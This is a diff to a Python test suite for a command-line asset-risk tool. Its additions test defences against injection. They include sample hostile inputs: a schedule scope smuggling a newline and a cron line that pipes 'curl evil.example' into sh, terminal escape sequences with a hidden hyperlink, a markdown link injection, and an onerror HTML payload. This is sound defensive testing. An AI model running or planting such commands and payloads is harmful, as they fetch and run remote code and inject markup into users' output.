@@ -1075,7 +1075,7 @@ def test_api_guard(m, monkeypatch):
     import contextlib, io
     calls = []
     monkeypatch.setattr(m, "call",
-                        lambda method, endpoint, body=None, retries=1: calls.append(endpoint) or {})
+                        lambda method, endpoint, body=None, retries=1, **kw: calls.append(endpoint) or {})
 
     def run(endpoint):
         class A:
@@ -1127,7 +1127,7 @@ def test_api_guard(m, monkeypatch):
     # timeout would run the action twice.
     retries_seen = []
     monkeypatch.setattr(m, "call",
-                        lambda method, endpoint, body=None, retries=1: retries_seen.append(retries) or {})
+                        lambda method, endpoint, body=None, retries=1, **kw: retries_seen.append(retries) or {})
 
     def run_method(method):
         class A:
@@ -3097,6 +3097,8 @@ def test_digest(m, monkeypatch):
     the header names as data, which is exactly what happened the first time."""
     import contextlib, io
     monkeypatch.setattr(m, "load_config", lambda: ("s.example", "tok", None))
+    # Configured, so an unmocked ldg_rebuild resolves s.example for real: ~16s of DNS and retry sleeps.
+    monkeypatch.setattr(m, "ldg_rebuild", lambda: {})
     monkeypatch.setattr(m, "stack_metrics",
                         lambda: {"metrics": {"assetCount": 34229, "userCount": 10305,
                                              "avg30DaysAssetCount": 34164, "avg30DaysUserCount": 10067}})
@@ -4858,7 +4860,9 @@ def test_alerts_notify(m, monkeypatch, tmp_path):
           "<script>" in text, True)
     check("the subject names the stack", "s.example" in subject, True)
     slack_payload = m.render_alerts_slack(nasty)
-    check("slack payload is a single text field", set(slack_payload), {"text"})
+    check("slack payload is one text field with link and media previews off",
+          (set(slack_payload), slack_payload.get("unfurl_links"), slack_payload.get("unfurl_media")),
+          ({"text", "unfurl_links", "unfurl_media"}, False, False))
     # The Workflows template posts each entry of `attachments` as a card; a body without them is
     # accepted with HTTP 202 and posts nothing, which is what the old {title, text} shape did.
     teams_payload = m.render_alerts_teams(nasty)
@@ -7917,7 +7921,7 @@ def test_low_findings(m, monkeypatch, tmp_path):
                        ("post", "CMDB/v2/smartlabel/search")):
         check("api -X %s %s is a read" % (method, ep), m.api_write_problem(method, ep), None)
     calls = []
-    monkeypatch.setattr(m, "call", lambda method, endpoint, body=None, retries=1: calls.append(method) or {})
+    monkeypatch.setattr(m, "call", lambda method, endpoint, body=None, retries=1, **kw: calls.append(method) or {})
     class A:
         method, endpoint, body, body_file = "PUT", "CMDB/v2/connector/profile/service", None, None
     refused = False
@@ -9239,10 +9243,10 @@ def test_stacks_move(m, monkeypatch, capsys, tmp_path):
                                                   "ts": "2026-10-12T17:00:41Z", "stack": old,
                                                   "cadence": "daily"}) + "\n")
 
-    def move(name, fqdn):
+    def move(name, fqdn, any_fqdn=False):
         class A:
             pass
-        A.name, A.fqdn = name, fqdn
+        A.name, A.fqdn, A.any_fqdn = name, fqdn, any_fqdn
         m.cmd_stacks_move(A())
         raw = capsys.readouterr().out
         return json.loads(raw), raw
@@ -9261,7 +9265,7 @@ def test_stacks_move(m, monkeypatch, capsys, tmp_path):
           [(new, "Bearer tok-acme-1111")])
 
     # --- refusals before any request ---------------------------------------------------------------
-    for args, why in ((("acme", old), "same address"), (("acme", "beta.example.com"), "address in use"),
+    for args, why in ((("acme", old), "same address"), (("acme", "beta.example.com", True), "address in use"),
                       (("nope", new), "unknown stack")):
         probed.clear()
         with pytest.raises(SystemExit):
@@ -9271,7 +9275,7 @@ def test_stacks_move(m, monkeypatch, capsys, tmp_path):
     write("snapshots.%s.jsonl" % "clash.example.com", "x")
     probed.clear()
     with pytest.raises(SystemExit):
-        move("beta", "clash.example.com")
+        move("beta", "clash.example.com", any_fqdn=True)
     check("refused onto an address that already has history", "merging" in capsys.readouterr().err, True)
 
     # --- the move -----------------------------------------------------------------------------------
@@ -9304,7 +9308,7 @@ def test_stacks_move(m, monkeypatch, capsys, tmp_path):
     probed.clear()
     monkeypatch.setattr(m, "_round_trip", lambda fq, k, c, meth, ep, d, h:
                         probed.append(h.get("Authorization")) or (200, "{}", None, None))
-    out, _ = move("beta", "beta2.example.com")
+    out, _ = move("beta", "beta2.example.com", any_fqdn=True)
     check("an inactive stack moves", (out["moved"], out["active"]), (True, False))
     check("...checked with its own token", probed, ["Bearer tok-beta-2222"])
     with open(m.CFG_PATH, encoding="utf-8") as f:
@@ -9688,3 +9692,186 @@ def test_token_routing(m):
         check("SKILL.md carries: %s" % rule[:50], rule in skill, True)
     check("SKILL.md no longer calls every saved token plain text",
           "note it's **plain text** in your user profile" in skill, False)
+
+
+def test_review_2026_10_19(m, monkeypatch, tmp_path):
+    """The 2026-10-19 performance and output-security review, each item asserted against the old code.
+
+    P1  call() slept 2s after the last attempt too, so every failing call paid for a retry it never made;
+    P3  list/top/summary held every raw page until parallel() returned, then projected;
+    P4  connector runs were message-built and scrubbed for every row, and repeats scrubbed once each;
+    S5  a newline in --entities added a line to the definition `schedule show` emits;
+    S6  the print-to-PDF URL was not percent-encoded, and Chrome ran in its default profile;
+    S7  terminal and markdown output printed customer strings raw;
+    S8  Slack rendered rule names as mrkdwn and unfurled links;
+    S10 _esc left quotes alone, which the report's single-quoted attributes need escaped.
+    """
+    import argparse as _ap
+
+    # --- P1: no sleep once no attempt remains -----------------------------------------------------
+    monkeypatch.setattr(m, "load_config", lambda: ("stack.example", "tok", None))
+    monkeypatch.setattr(m, "pace", lambda: None)
+    monkeypatch.setattr(m, "_ssl_context", lambda: None)
+    slept = []
+    with monkeypatch.context() as mp:
+        mp.setattr(m.time, "sleep", lambda s: slept.append(s))
+
+        def down(*a):
+            raise OSError("getaddrinfo failed")
+        mp.setattr(m, "_round_trip", down)
+        for retries, want in ((0, []), (1, [2]), (2, [2, 2])):
+            slept.clear()
+            with pytest.raises(RuntimeError):
+                m.call("GET", "/CMDB/v2/x", retries=retries)
+            check("transport failure, retries=%d: sleeps only between attempts" % retries, slept, want)
+        mp.setattr(m, "_round_trip", lambda *a: (500, "boom", None, None))
+        slept.clear()
+        with pytest.raises(RuntimeError):
+            m.call("GET", "/CMDB/v2/x", retries=1)
+        check("HTTP 500, retries=1: one sleep, not two", slept, [2])
+
+    # --- P3: each parallel task returns a projected page ------------------------------------------
+    junk = "x" * 64
+
+    def page(n, start=0):
+        return [{"Asset_Name": "A%d" % (start + i), "Risk_Score": float(1000 - start - i), "OS": "Linux",
+                 "Risk_Level": "3-high", "Junk_Field": junk} for i in range(n)]
+
+    seen = []
+    real_parallel = m.parallel
+
+    def spy(tasks):
+        out = real_parallel(tasks)
+        seen.extend(out)
+        return out
+    monkeypatch.setattr(m, "parallel", spy)
+    monkeypatch.setattr(m, "check_fields", lambda *a, **k: None)
+
+    def raw_records(results):
+        """Any task result still carrying a field nobody asked for."""
+        found = 0
+        for r in results:
+            rows = r if isinstance(r, list) else []
+            found += sum(1 for x in rows if isinstance(x, dict) and "Junk_Field" in x)
+        return found
+
+    monkeypatch.setattr(m, "count_records", lambda *a, **k: 250)
+    monkeypatch.setattr(m, "call", lambda meth, ep, body=None, retries=1: {
+        "totalRecords": 250, "data": page(100, 100 * body["paging"]["page"])})
+    a = _ap.Namespace(table="asset", where=None, select=None, all=False, limit=250, count_only=False)
+    out = m.list_records(a)
+    check("list still returns every requested row", (out["shown"], out["rows"][0]["Asset_Name"]), (250, "A0"))
+    check("...and no list tail task returned a raw record", raw_records(seen), 0)
+    check("...nor does a row carry the unselected field", any("Junk_Field" in r for r in out["rows"]), False)
+
+    seen.clear()
+    monkeypatch.setattr(m, "_top_rung_start", lambda *a: 0)
+    monkeypatch.setattr(m, "_top_rung_save", lambda *a: None)
+    out = m.top_n("asset", "Risk_Score", 5)
+    check("top still ranks the tail", [r["Asset_Name"] for r in out["top"]], ["A0", "A1", "A2", "A3", "A4"])
+    check("...and no top tail task returned a raw record", raw_records(seen), 0)
+
+    seen.clear()
+    monkeypatch.setattr(m, "field_type", lambda *a: "String")
+    monkeypatch.setattr(m, "call", lambda meth, ep, body=None, retries=1: {
+        "totalRecords": 1000, "data": [dict(r, OS="OS%d" % (body["paging"]["page"] % 3))
+                                       for r in page(100, 100 * body["paging"]["page"])]})
+    monkeypatch.setattr(m, "count_records", lambda t, q: 1000 if not any(
+        c.get("searchFieldName") == "OS" and c.get("operator") == "==" for grp in q for c in grp) else 333)
+    out = m.summarize_by("asset", "OS", refresh=True)
+    check("summary still discovers every sampled value", sorted(g["value"] for g in out["groups"]),
+          ["OS0", "OS1", "OS2"])
+    check("...from the whole sample", out["sampledForValues"], 800)
+    # Page 0 comes back raw on purpose (its totalRecords sizes the sample); the 7 sampled pages may not.
+    check("...and only page 0 came back from its task as a raw page",
+          sum(1 for r in seen if isinstance(r, dict) and "data" in r), 1)
+    monkeypatch.setattr(m, "parallel", real_parallel)
+
+    # --- P4: identical messages, with the scrub paid once per distinct line -----------------------
+    secret = "svc-ingest-account"
+    lines = [{"WARNING": "2026-08-26 04:26:19 | WARNING  | loguru._logger:warning:1979 - login %s refused" % secret}
+             ] * 40 + [{"ERROR": "2026-08-26 04:26:20 | ERROR  | x.y:z:1 - login %s refused" % secret.upper()},
+                       {"ERROR": "timeout"}]
+    calls = []
+    real_scrub = m._scrub
+    with monkeypatch.context() as mp:
+        mp.setattr(m, "_scrub", lambda t, s=(): (calls.append(t), real_scrub(t, s))[1])
+        msg = m._friendly_event_message(lines, limit=3, secrets={secret})
+    check("repeats and redaction-equal lines still collapse into one message",
+          msg, "login %s refused; timeout" % m.REDACTED)
+    check("...and each distinct raw line is scrubbed once", len(calls), 3)
+
+    rows = [{"platform": "crowdstrike", "bridge_name": "cs", "profile": "p", "_time": t, "status": "Success",
+             "output_records": t, "_utc": "u%d" % t, "event_messages": [{"INFO": "run %d" % t}]}
+            for t in (5, 9, 7)]
+    rows.append({"platform": "action", "bridge_name": "act", "profile": "p", "_time": 3, "status": "Success",
+                 "event_messages": "acted"})
+    built = []
+    real_fem = m._friendly_event_message
+    with monkeypatch.context() as mp:
+        mp.setattr(m, "call", lambda *a, **k: {"content": rows, "totalPages": 1})
+        mp.setattr(m, "_friendly_event_message", lambda *a, **k: (built.append(a[0]), real_fem(*a, **k))[1])
+        ingest, actions, pipeline, truncated = m._fetch_connector_runs()
+    check("the newest run per key still wins", (ingest[("cs", "p")]["records"], ingest[("cs", "p")]["message"]),
+          (9, "run 9"))
+    check("...an action row is still counted apart", [r["message"] for r in actions], ["acted"])
+    check("...and only the winners had a message built", len(built), 2)
+
+    # --- S5: no control character can reach a schedule definition --------------------------------
+    # Mocked first, so the label case is refused for its newline and not for an unknown label.
+    monkeypatch.setattr(m, "find_label", lambda term: [{"name": "Crown Jewels", "field": "SL_Crown_Jewels",
+                                                         "type": "Binary", "table": "asset"}])
+    for bad in ("top5:asset:Risk_Score\n* * * * * curl evil.example | sh", "top5:asset\n:Risk_Score",
+                "top5:asset:Risk_Score\r", "top5:as set:Risk_Score", "top5:asset:Risk-Score",
+                "label:Crown\nJewels:Risk_Score"):
+        spec, problem = m.parse_entity_scope(bad)
+        check("scope %r is refused" % bad, (spec, bool(problem)), (None, True))
+    check("a plain top-N scope still parses", m.parse_entity_scope("top5:asset:Risk_Score")[0]["n"], 5)
+    check("...and a label name with a space still parses",
+          m.parse_entity_scope("label:Crown Jewels:Risk_Score")[0]["label"], "Crown Jewels")
+
+    # --- S6: the PDF URL is encoded, and Chrome gets a throwaway profile ---------------------------
+    ran = []
+    import subprocess as _sp
+    monkeypatch.setattr(_sp, "run", lambda cmd, **k: ran.append(list(cmd)))
+    d = tmp_path / "rep #1"   # '?' would be the other case, but Windows refuses it in a filename
+    d.mkdir()
+    m._print_to_pdf("chrome", str(d / "r.tmp.html"), str(d / "r.pdf"))
+    cmd = ran[0]
+    url = cmd[-1]
+    check("a '#' or space in the path is percent-encoded", ("%23" in url, "%20" in url, "#" in url),
+          (True, True, False))
+    check("...and the URL is a file URI", url.startswith("file:///"), True)
+    prof = [c.split("=", 1)[1] for c in cmd if c.startswith("--user-data-dir=")]
+    check("Chrome runs with a throwaway profile and no extensions",
+          (len(prof), "--disable-extensions" in cmd), (1, True))
+    check("...which is removed afterwards", bool(prof) and os.path.exists(prof[0]), False)
+
+    # --- S7: terminal and markdown output ---------------------------------------------------------
+    esc = "\x1b]8;;https://evil.example\x07click\x1b]8;;\x07 \x9b2J"
+    ascii_view = m._ascii_blast_radius({"type": "user", "identity": {"displayName": "Ada" + esc},
+                                        "risk": {"score": 50, "level": "3-high"}})
+    check("blast radius strips C0/C1 controls", any(c in ascii_view for c in "\x1b\x07\x9b"), False)
+    check("...but keeps its line breaks", ascii_view.count("\n") > 3, True)
+    v = {"firing": [{"rule": "r|1 [x](https://evil.example)", "message": "a|b\nc\x1b[31m"}], "clear": [],
+         "unevaluable": [], "summary": {"firing": 1, "unevaluable": 0, "clear": 0}, "note": "n\x1b[2Jote"}
+    md = m.render_alerts(v)
+    row = [ln for ln in md.split("\n") if ln.startswith("| \U0001f534")][0]
+    check("a pipe in a rule or message cannot split the row", len(re.findall(r"(?<!\\)\|", row)), 4)
+    check("...a link cannot form", "](https" in row.replace("\\](", ""), False)
+    check("...and no control character survives", "\x1b" in md, False)
+
+    # --- S8: Slack ---------------------------------------------------------------------------------
+    sl = m.render_alerts_slack({"firing": [{"rule": "*bold* `tick` ~s~", "message": "m"}], "clear": [],
+                                "unevaluable": [], "summary": {"firing": 1, "unevaluable": 0, "clear": 0}})
+    check("a Slack rule name is a code span the name cannot close", "`*bold* 'tick' ~s~`" in sl["text"], True)
+
+    # --- S10: quotes ---------------------------------------------------------------------------------
+    check("_esc escapes both quote characters", m._esc("a'b\"c<&"), "a&#x27;b&quot;c&lt;&amp;")
+    _, _, body = m._profile_html({"type": "user", "identity": {"ownerName": "U"},
+                                  "risk": {"score": 1, "level": "1-low"},
+                                  "threats": {"leakedCredentialCount": "<img src=x onerror=alert(1)>"}})
+    check("a non-numeric leaked-credential count cannot inject markup", "<img" in body, False)
+
+    # Last, because it names a helper the old code doesn't have.
+    check("_md_cell escapes a backslash before what it protects", m._md_cell("a\\|b"), "a\\\\\\|b")
